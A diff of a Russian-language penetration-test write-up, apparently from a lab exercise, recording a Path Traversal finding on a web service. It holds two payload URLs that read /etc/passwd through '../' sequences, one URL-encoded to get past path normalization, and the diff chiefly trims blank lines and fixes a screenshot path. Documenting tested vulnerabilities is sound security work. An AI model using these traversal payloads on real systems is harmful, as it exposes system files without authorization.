@@ -36,7 +36,6 @@ ___
 <details>
 <summary>Пошаговая реализация</summary>
 
-
 - **Step 1. Поиск пути**
     
 Зная предполагаемую структуру файловой системы хоста, можно получить доступ к конфиденциальным файлам, таким как `/etc/passwd`.
@@ -44,8 +43,6 @@ ___
 Путь до `/etc/passwd`:
     
 `http://92.51.39.106:7788/read?file=../../../../../../etc/passwd`
-
-
 
 - **Step 2. Обход нормализации**
 
@@ -55,15 +52,11 @@ ___
     
 `http://92.51.39.106:7788/read file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`
 
-
-![](screenshots/TESTING/Session_Hijacking_Attack/admin_cookie.png)
+![](screenshots/TESTING/Path_Traversal/7788/passwd.png)
    
-
-
 - **Вывод**
     
 В результате успешной реализации Path Traversal, был получен доступ к файлу `/etc/passwd`, **уязвимость подтверждена**.
-
 
 </details>
 
